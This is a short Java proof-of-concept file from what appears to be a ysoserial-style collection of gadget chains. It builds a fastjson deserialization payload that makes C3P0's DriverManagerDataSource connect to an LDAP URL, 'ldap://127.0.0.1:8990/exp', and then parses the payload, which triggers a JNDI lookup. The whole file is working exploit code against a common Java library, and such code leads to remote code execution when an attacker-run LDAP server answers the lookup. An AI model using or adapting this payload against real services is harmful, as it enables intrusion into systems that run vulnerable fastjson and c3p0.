package ysoserial.payloads.tabbyGadgetChains.C3p0;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class C3P0_Poc4 {
    public static void main(String[] args) {
        String poc = "{" +
                "\"@type\": \"com.mchange.v2.c3p0.DriverManagerDataSource\"," +
                "\"jdbcUrl\":\"ldap://127.0.0.1:8990/exp\","+
                "\"properties\":{\"@type\": \"com.mchange.v2.c3p0.impl.AuthMaskingProperties\"},"+
                "\"connection\":{\"$ref\": \"$.connection\"}"+
                "}";
        System.out.println(poc);
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
